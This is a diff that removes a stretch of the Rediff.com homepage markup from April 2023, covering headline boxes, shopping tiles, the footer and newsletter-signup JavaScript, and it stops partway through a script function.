-                    <a href="https://www.rediff.com/business/report/blinkit-permanently-shuts-some-dark-stores-amid-worker-strike/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fblinkit-permanently-shuts-some-dark-stores-amid-worker-strike%2F20230418.htm___&position=15_1-2_3&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">Blinkit permanently shuts some dark stores</a>
-                </h2>
-                <h2 class="business" data-boxno="15_1-2_4" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fresults-preview-india-inc-likely-to-report-highly-profitable-q4%2F20230418.htm">
-                    <a href="https://www.rediff.com/business/report/results-preview-india-inc-likely-to-report-highly-profitable-q4/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fresults-preview-india-inc-likely-to-report-highly-profitable-q4%2F20230418.htm___&position=15_1-2_4&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">Results preview: India Inc likely to report highly profitable Q4</a>
-                </h2>
-                <h2 class="business" data-boxno="15_1-2_5" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fnses-strict-governance-platform-in-limbo-after-tepid-corporate-response%2F20230418.htm">
-                    <a href="https://www.rediff.com/business/report/nses-strict-governance-platform-in-limbo-after-tepid-corporate-response/20230418.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Fnses-strict-governance-platform-in-limbo-after-tepid-corporate-response%2F20230418.htm___&position=15_1-2_5&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">NSE's strict-governance platform in limbo</a>
-                </h2>
-                <p class="alignR">
-                    <a href="https://www.rediff.com/business" class="morestory" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness___&position=15_1-2_M&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">More Business</a>
-                </p>
-            </div>
-            <div class="nbox" data-boxno="15_3" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Finterview%2Fwhat-are-phonepes-expansion-plans%2F20230417.htm">
-                <p class="more">
-                    <a class="backbusiness" href="https://www.rediff.com/business" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/business___&position=15_3_L&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">business</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/money/2023/apr/17sameer-nigam1.jpg" class="img" href="https://www.rediff.com/business/interview/what-are-phonepes-expansion-plans/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Finterview%2Fwhat-are-phonepes-expansion-plans%2F20230417.htm___&position=15_3_I&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">
-                        <img alt="What Are PhonePe's Expansion Plans?" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/business/interview/what-are-phonepes-expansion-plans/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Finterview%2Fwhat-are-phonepes-expansion-plans%2F20230417.htm___&position=15_3_T&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">What Are PhonePe's Expansion Plans?</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="15_4" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Fmahesh-vyas-marchs-employment-figures-disappointing%2F20230414.htm">
-                <p class="more">
-                    <a class="backbusiness" href="https://www.rediff.com/business" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/business___&position=15_4_L&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">business</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/money/2023/apr/13labourers.jpg" class="img" href="https://www.rediff.com/business/column/mahesh-vyas-marchs-employment-figures-disappointing/20230414.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Fmahesh-vyas-marchs-employment-figures-disappointing%2F20230414.htm___&position=15_4_I&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">
-                        <img alt="March's Employment Figures Disappointing" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/business/column/mahesh-vyas-marchs-employment-figures-disappointing/20230414.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Fcolumn%2Fmahesh-vyas-marchs-employment-figures-disappointing%2F20230414.htm___&position=15_4_T&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">March's Employment Figures Disappointing</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="15_5" data-track="label=edit_business&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Ftata-neu-20-plans-better-experience%2F20230417.htm">
-                <p class="more">
-                    <a class="backbusiness" href="https://www.rediff.com/business" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/business___&position=15_5_L&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">business</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/money/2023/apr/17tata-neu-1.jpg" class="img" href="https://www.rediff.com/business/report/tata-neu-20-plans-better-experience/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Ftata-neu-20-plans-better-experience%2F20230417.htm___&position=15_5_I&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">
-                        <img alt="Tata Neu 2.0 Plans Better Experience" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/business/report/tata-neu-20-plans-better-experience/20230417.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Freport%2Ftata-neu-20-plans-better-experience%2F20230417.htm___&position=15_5_T&label=edit_business&c_type=edit_business&property=hp_in_pc');return false;">Tata Neu 2.0 Plans Better Experience</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div class="secstorybox editorspick">
-                <h3>EDITOR'S PICK</h3>
-                <i class="clear"></i>
-                <h2 class="getahead" data-boxno="16_1-2_1" data-track="label=edit_editorspick&c_type=edit_getahead&news=https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fmust-read-what-to-do-with-investments-in-fy24%2F20230412.htm">
-                    <a href="https://www.rediff.com/getahead/report/must-read-what-to-do-with-investments-in-fy24/20230412.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fgetahead%2Freport%2Fmust-read-what-to-do-with-investments-in-fy24%2F20230412.htm___&position=16_1-2_1&label=edit_editorspick&c_type=edit_getahead&property=hp_in_pc');return false;">What To Do With Investments In FY24</a>
-                </h2>
-                <h2 class="news" data-boxno="16_1-2_2" data-track="label=edit_editorspick&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Framesh-inder-singh-people-will-soon-forget-amritpal%2F20230412.htm">
-                    <a href="https://www.rediff.com/news/interview/ramesh-inder-singh-people-will-soon-forget-amritpal/20230412.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Framesh-inder-singh-people-will-soon-forget-amritpal%2F20230412.htm___&position=16_1-2_2&label=edit_editorspick&c_type=edit_news&property=hp_in_pc');return false;">'People Will Soon Forget Amritpal'</a>
-                </h2>
-                <h2 class="business" data-boxno="16_1-2_3" data-track="label=edit_editorspick&c_type=edit_business&news=https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Finterview%2Fsumedha-dasgupta-we-may-be-late-to-board-the-bus-but-we-have-not-missed-the-bus%2F20230411.htm">
-                    <a href="https://www.rediff.com/business/interview/sumedha-dasgupta-we-may-be-late-to-board-the-bus-but-we-have-not-missed-the-bus/20230411.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fbusiness%2Finterview%2Fsumedha-dasgupta-we-may-be-late-to-board-the-bus-but-we-have-not-missed-the-bus%2F20230411.htm___&position=16_1-2_3&label=edit_editorspick&c_type=edit_business&property=hp_in_pc');return false;">'We may be late to board the bus, but...'</a>
-                </h2>
-                <h2 class="news" data-boxno="16_1-2_4" data-track="label=edit_editorspick&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fprakash-javadekar-bjp-will-win-5-lok-sabha-seats-in-kerala-in-2024%2F20230412.htm">
-                    <a href="https://www.rediff.com/news/interview/prakash-javadekar-bjp-will-win-5-lok-sabha-seats-in-kerala-in-2024/20230412.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Finterview%2Fprakash-javadekar-bjp-will-win-5-lok-sabha-seats-in-kerala-in-2024%2F20230412.htm___&position=16_1-2_4&label=edit_editorspick&c_type=edit_news&property=hp_in_pc');return false;">'BJP Will Win 5 Lok Sabha Seats In Kerala in 2024'</a>
-                </h2>
-                <h2 class="news" data-boxno="16_1-2_5" data-track="label=edit_editorspick&c_type=edit_news&news=https%3A%2F%2Fwww.rediff.com%2Fnews%2Fcolumn%2Fshekhar-gupta-why-did-supreme-court-strengthen-uapa%2F20230413.htm">
-                    <a href="https://www.rediff.com/news/column/shekhar-gupta-why-did-supreme-court-strengthen-uapa/20230413.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fnews%2Fcolumn%2Fshekhar-gupta-why-did-supreme-court-strengthen-uapa%2F20230413.htm___&position=16_1-2_5&label=edit_editorspick&c_type=edit_news&property=hp_in_pc');return false;">Why Did Supreme Court Strengthen UAPA?</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="16_3" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fstep-inside-sonams-delhi-home%2F20230411.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=16_3_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/11sonam-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/step-inside-sonams-delhi-home/20230411.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fstep-inside-sonams-delhi-home%2F20230411.htm___&position=16_3_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="Step Inside Sonam's Delhi Home" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/report/step-inside-sonams-delhi-home/20230411.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fstep-inside-sonams-delhi-home%2F20230411.htm___&position=16_3_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">Step Inside Sonam's Delhi Home</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="16_4" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsrk-ab-rekha-bond-over-bandage%2F20230411.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=16_4_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/10bolly-lead1.jpg" class="img" href="https://www.rediff.com/movies/report/srk-ab-rekha-bond-over-bandage/20230411.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsrk-ab-rekha-bond-over-bandage%2F20230411.htm___&position=16_4_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="SRK, AB, Rekha Bond Over Bandage!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/report/srk-ab-rekha-bond-over-bandage/20230411.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Freport%2Fsrk-ab-rekha-bond-over-bandage%2F20230411.htm___&position=16_4_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">SRK, AB, Rekha Bond Over Bandage!</a>
-                </h2>
-            </div>
-            <div class="nbox" data-boxno="16_5" data-track="label=edit_movies&c_type=edit_movies&news=https%3A%2F%2Fwww.rediff.com%2Fmovies%2Fspecial%2Fwhen-bollywood-lost-its-memory%2F20230413.htm">
-                <p class="more">
-                    <a class="backmovies" href="https://www.rediff.com/movies" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/movies___&position=16_5_L&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">movies</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//im.rediff.com/210-170/movies/2023/apr/13shaakunthalam-lead1.jpg" class="img" href="https://www.rediff.com/movies/special/when-bollywood-lost-its-memory/20230413.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Fspecial%2Fwhen-bollywood-lost-its-memory%2F20230413.htm___&position=16_5_I&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">
-                        <img alt="When Bollywood Lost Its Memory!" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://www.rediff.com/movies/special/when-bollywood-lost-its-memory/20230413.htm" onclick="trackURL('https://track.rediff.com/click?url=___https%3A%2F%2Fwww.rediff.com%2Fmovies%2Fspecial%2Fwhen-bollywood-lost-its-memory%2F20230413.htm___&position=16_5_T&label=edit_movies&c_type=edit_movies&property=hp_in_pc');return false;">When Bollywood Lost Its Memory!</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <i class="clear"></i>
-            <div id="div_trndnews_container" class="trndnews_container clear-fix" data-rowno="17"></div>
-            <div id="trend_2" class="nbox" data-boxno="18_1" data-track="label=shopping&c_type=shopping&c_id=21666641">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_18_1_L_21666641___&position=18_1_L&label=Shopping&c_type=shopping&c_ic=21666641&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/28705/d/dr_020_pl._OPUS-Party-Aline-100-Cotton-Purple-Womenaposs-Dress-Code--DR020PL.jpg" class="img" href="https://shopping.rediff.com/product/opus-party-aline-100-cotton-purple-womenaposs-dress-code--dr020pl/21666641" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/opus-party-aline-100-cotton-purple-womenaposs-dress-code--dr020pl/21666641?sc_cid=inhome_trend_18_1_I_21666641___&position=18_1_I&label=shopping&c_type=shopping&c_id=21666641&property=hp_in_pc');return false;">
-                        <img alt="OPUS Party A-line 100% Cotton Purple Women&apos;s Dress (Code - DR_020_PL)" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/opus-party-aline-100-cotton-purple-womenaposs-dress-code--dr020pl/21666641" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/opus-party-aline-100-cotton-purple-womenaposs-dress-code--dr020pl/21666641?sc_cid=inhome_trend_18_1_T_21666641___&position=18_1_T&label=shopping&c_type=shopping&c_id=21666641&property=hp_in_pc');return false;">OPUS Party A-line 100% Cotton Purple - Rs.2,699 onwards</a>
-                </h2>
-            </div>
-            <div id="trend_3" class="nbox" data-boxno="18_2" data-track="label=shopping&c_type=shopping&c_id=24918100">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_18_2_L_24918100___&position=18_2_L&label=Shopping&c_type=shopping&c_ic=24918100&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/19655/7/7wpackof4._Vizio-7W-Premium-Quality-Led-Bulbs-Pack-of-4.jpg" class="img" href="https://shopping.rediff.com/product/vizio-7w-premium-quality-led-bulbs-pack-of-4/24918100" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/vizio-7w-premium-quality-led-bulbs-pack-of-4/24918100?sc_cid=inhome_trend_18_2_I_24918100___&position=18_2_I&label=shopping&c_type=shopping&c_id=24918100&property=hp_in_pc');return false;">
-                        <img alt="Vizio 7W Premium Quality Led Bulbs Pack of 4" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/vizio-7w-premium-quality-led-bulbs-pack-of-4/24918100" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/vizio-7w-premium-quality-led-bulbs-pack-of-4/24918100?sc_cid=inhome_trend_18_2_T_24918100___&position=18_2_T&label=shopping&c_type=shopping&c_id=24918100&property=hp_in_pc');return false;">Vizio 7W Premium Quality Led Bulbs Pack - Rs.389 onwards</a>
-                </h2>
-            </div>
-            <div id="trend_4" class="nbox" data-boxno="18_3" data-track="label=shopping&c_type=shopping&c_id=22372430">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_18_3_L_22372430___&position=18_3_L&label=Shopping&c_type=shopping&c_ic=22372430&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/24042/4/41hpznaergl_5a380de875ecf._Ubon-UB1085cchamp-Headset-with-Mic-High-Quality-Bass.jpg" class="img" href="https://shopping.rediff.com/product/ubon-ub1085cchamp-headset-with-mic-high-quality-bass/22372430" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/ubon-ub1085cchamp-headset-with-mic-high-quality-bass/22372430?sc_cid=inhome_trend_18_3_I_22372430___&position=18_3_I&label=shopping&c_type=shopping&c_id=22372430&property=hp_in_pc');return false;">
-                        <img alt="Ubon UB1085c/champ Headset with Mic High Quality Bass" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/ubon-ub1085cchamp-headset-with-mic-high-quality-bass/22372430" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/ubon-ub1085cchamp-headset-with-mic-high-quality-bass/22372430?sc_cid=inhome_trend_18_3_T_22372430___&position=18_3_T&label=shopping&c_type=shopping&c_id=22372430&property=hp_in_pc');return false;">Ubon UB1085c/champ Headset with Mic High - Rs.349 onwards</a>
-                </h2>
-            </div>
-            <div id="trend_5" class="nbox" data-boxno="18_4" data-track="label=shopping&c_type=shopping&c_id=24859951">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_18_4_L_24859951___&position=18_4_L&label=Shopping&c_type=shopping&c_ic=24859951&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/28705/j/jl_3425_bk-big_1._JL-Collections-Unisex-Leather-Black-Shoulder-Expandable-Big-sling-Bag-with-Flap-Closure.jpg" class="img" href="https://shopping.rediff.com/product/jl-collections-unisex-leather-black-shoulder-expandable-big-sling-bag-with-flap-closure/24859951" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/jl-collections-unisex-leather-black-shoulder-expandable-big-sling-bag-with-flap-closure/24859951?sc_cid=inhome_trend_18_4_I_24859951___&position=18_4_I&label=shopping&c_type=shopping&c_id=24859951&property=hp_in_pc');return false;">
-                        <img alt="JL Collections Unisex Leather Black Shoulder Expandable Big sling Bag with Flap Closure" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/jl-collections-unisex-leather-black-shoulder-expandable-big-sling-bag-with-flap-closure/24859951" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/jl-collections-unisex-leather-black-shoulder-expandable-big-sling-bag-with-flap-closure/24859951?sc_cid=inhome_trend_18_4_T_24859951___&position=18_4_T&label=shopping&c_type=shopping&c_id=24859951&property=hp_in_pc');return false;">JL Collections Unisex Leather Black - Rs.5,130 onwards</a>
-                </h2>
-            </div>
-            <div id="trend_6" class="nbox" data-boxno="18_5" data-track="label=shopping&c_type=shopping&c_id=21797416">
-                <p class="more">
-                    <a class="backshop" href="https://shopping.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com?sc_cid=inhome_trend_18_5_L_21797416___&position=18_5_L&label=Shopping&c_type=shopping&c_ic=21797416&property=hp_in_pc');return false;">Shopping</a>
-                </p>
-                <h5>
-                    <a data-relsrc="//imshopping.rediff.com/imgshop/250-250/shopping/pixs/28705/8/84_jl_tiejl_belt._JL-Collections-6-Card-Slots-Navy-Blue-Menaposs-Leather-Wallet-with-Tie-amp-Belt-Pack-of-3.jpg" class="img" href="https://shopping.rediff.com/product/jl-collections-6-card-slots-navy-blue-menaposs-leather-wallet-with-tie-amp-belt-pack-of-3/21797416" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/jl-collections-6-card-slots-navy-blue-menaposs-leather-wallet-with-tie-amp-belt-pack-of-3/21797416?sc_cid=inhome_trend_18_5_I_21797416___&position=18_5_I&label=shopping&c_type=shopping&c_id=21797416&property=hp_in_pc');return false;">
-                        <img alt="JL Collections 6 Card Slots Navy Blue Men&apos;s Leather Wallet with Tie &amp; Belt (Pack of 3)" src="//imworld.rediff.com/worldrediff/pix/blank.gif"/>
-                    </a>
-                </h5>
-                <h2 class="hdtitle">
-                    <a href="https://shopping.rediff.com/product/jl-collections-6-card-slots-navy-blue-menaposs-leather-wallet-with-tie-amp-belt-pack-of-3/21797416" onclick="trackURL('https://track.rediff.com/click?url=___https://shopping.rediff.com/product/jl-collections-6-card-slots-navy-blue-menaposs-leather-wallet-with-tie-amp-belt-pack-of-3/21797416?sc_cid=inhome_trend_18_5_T_21797416___&position=18_5_T&label=shopping&c_type=shopping&c_id=21797416&property=hp_in_pc');return false;">JL Collections 6 Card Slots Navy Blue - Rs.3,330 onwards</a>
-                </h2>
-            </div>
-            <i class="clear"></i>
-            <div id="footertrack">&nbsp;</div>
-            <div class="alignC">
-                <div id="world_bottom1" class="div_advt_bottom">
-                    <ins data-revive-zoneid="79" data-revive-source="_blank" data-revive-target="_blank" data-revive-id="4b71f4079fb345c8ac958d0e9f0b56dd" data-zonename="Rediff_Home_Native_Widget_BTF_IN"></ins>
-                </div>
-            </div>
-        </div>
-        <!-- red_container ends -->
-        <!-- footer starts -->
-        <div class="footer alignC">
-            &#169;2023 <a href="http://us.rediff.com/" title="Rediff.com US">Rediff.com US</a>
-            - <a href="https://investor.rediff.com/" onclick="trackURL('https://track.rediff.com/click?url=___https://investor.rediff.com/___&position=footer&label=investors&property=hp_in_pc');return false;">Investors</a>
-            - <a href="https://clients.rediff.com/rediff_advertisewithus/contact.htm" onclick="trackURL('https://track.rediff.com/click?url=___https://clients.rediff.com/rediff_advertisewithus/contact.htm___&position=footer&label=advtwithus&property=hp_in_pc');return false;">Advertise with us</a>
-            - <a href="https://www.rediff.com/disclaim.htm" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/disclaim.htm___&position=footer&label=disclaimer&property=hp_in_pc');return false;">Disclaimer</a>
-            - <a href="https://www.rediff.com/w3c/policy.html">Privacy</a>
-            - <a href="http://labs.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___http://labs.rediff.com___&position=footer&label=redifflabs&property=hp_in_pc');return false;">Rediff Labs</a>
-            - <a href="https://www.rediff.com/sitemap.xml" title="Sitemap.xml">Sitemap</a>
-            - <a href="http://mypage.rediff.com/feedback" onclick="trackURL('https://track.rediff.com/click?url=___http://mypage.rediff.com/feedback___&position=footer&label=feedback&property=hp_in_pc');return false;">Feedback</a>
-            - <a href="https://support.rediff.com" onclick="trackURL('https://track.rediff.com/click?url=___https://support.rediff.com___&position=footer&label=contactus&property=hp_in_pc');return false;">Contact Us</a>
-            - <a href="https://www.rediff.com/aboutus.html" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/aboutus.html___&position=footer&label=aboutus&property=hp_in_pc');return false;">About us</a>
-            - <a href="https://www.rediff.com/terms.html" onclick="trackURL('https://track.rediff.com/click?url=___https://www.rediff.com/terms.html___&position=footer&label=termsofuse&property=hp_in_pc');return false;">Terms of use</a>
-            - <a href="https://www.rediff.com/grievances.html">Grievances</a>
-        </div>
-        <!-- footer ends -->
-        <noscript>
-            <div class="msg_noscript">Your browser does not support JavaScript or it may be disabled!</div>
-        </noscript>
-        <script>
-            if (document.getElementById('subnews_icon')) {
-                document.getElementById('subnews_icon').onclick = function() {
-                    if (document.getElementById('div_subscribe_nl')) {
-                        document.getElementById('div_subscribe_nl').style.display = "block";
-                    }
-                    var subnews_icon_trackimg = new Image();
-                    subnews_icon_trackimg.src = "https://indmetric.rediff.com/www.rediff.com/news-subs/click-homebox.html?devicetype=PC&rkey=" + Math.floor(Math.random() * 1000000);
-                }
-                if (document.getElementById('cancel_btn')) {
-                    document.getElementById('cancel_btn').onclick = function() {
-                        resetSubscribe();
-                    }
-                }
-            }
-            function validEmail(email) {
-                var exclude = /[^@\-\.\w]|^[_@\.\-]|[\._\-]{2}|[@\.]{2}|(@)[^@]*\1/;
-                var hc = /\.[a-zA-Z]{2,4}$/;
-                if ((email.search(exclude) != -1) || (email.search(hc) == -1)) {
-                    return false;
-                }
-                atPos = email.indexOf("@", 0);
-                pPos1 = email.indexOf(".", 0);
-                periodPos = email.indexOf(".", atPos);
-                pos1 = pPos1;
-                pos2 = 0;
-                while (pos2 > -1) {
-                    pos2 = email.indexOf(".", pos1 + 1);
-                    if (pos2 == pos1 + 1) {
-                        return false;
-                    } else {
-                        pos1 = pos2
-                    }
-                }
-                if (atPos == -1) {
-                    return false;
-                }
-                if (atPos == 0) {
-                    return false;
-                }
-                if (pPos1 == 0) {
-                    return false;
-                }
-                if (email.indexOf("@", atPos + 1) > -1) {
-                    return false;
-                }
-                if (periodPos == -1) {
-                    return false;
-                }
-                if (atPos + 1 == periodPos) {
-                    return false;
-                }
-                if (periodPos + 3 > email.length) {
-                    return false;
-                }
-                return true;
-            }
-            function resetSubscribe() {
-                document.getElementById('div_subscribe_nl').style.display = "none";
-                document.getElementById('subwait_top').style.visibility = 'hidden';
-                document.getElementById('div_thanks').style.display = "none";
-                document.getElementById('div_thanks').innerHTML = "";
-                document.getElementById('div_err_message').style.display = "none";
-                document.getElementById('div_err_message').innerHTML = "";
-                document.getElementById('sub_email_in_top').value = "";
-                document.getElementById('subscribe_btn_in_top').disabled = false;
-                document.getElementById('frm_subscription_in_top').style.display = "block";
-            }
-            function subscribeNewsletterHome(emailfield, subscribebtn) {
-                var email = document.getElementById(emailfield).value;
-                var sub_captcha = "";
-                var section = "homepage-pc";
-                var article_url = "";
-                var template = "";
-                var page_type = "homepage";
-                var subreq;
-                if (!validEmail(email)) {
-                    alert("Please enter a valid email");
-                    document.getElementById(emailfield).focus();
-                    return false;
-                }
-                var url = cdn_domain.replace('http://', '//') + "/newsletter";
-                var postdata = "email=" + email + "&captcha=" + sub_captcha + "&section=" + section + "&article_url=" + encodeURIComponent(article_url) + "&country=india&template=" + template + "&page_type=" + page_type + "&output=xml";
-                if (window.XMLHttpRequest) {
-                    subreq = new XMLHttpRequest();
-                    subreq.onreadystatechange = statusstateChanged;
-                    subreq.open("POST", url, true);
-                    subreq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                    subreq.send(postdata);
-                } else if (window.ActiveXObject) {
-                    subreq = new ActiveXObject("Microsoft.XMLHTTP");
-                    if (subreq) {
-                        subreq.onreadystatechange = statusstateChanged;
-                        subreq.open("POST", url, true);
-                        subreq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                        subreq.send(postdata);
-                    }
-                }
-                function statusstateChanged() {
-                    if (subreq.readyState == 4 || subreq.readyState == "complete") {
-                        if (subreq.status == 200) {
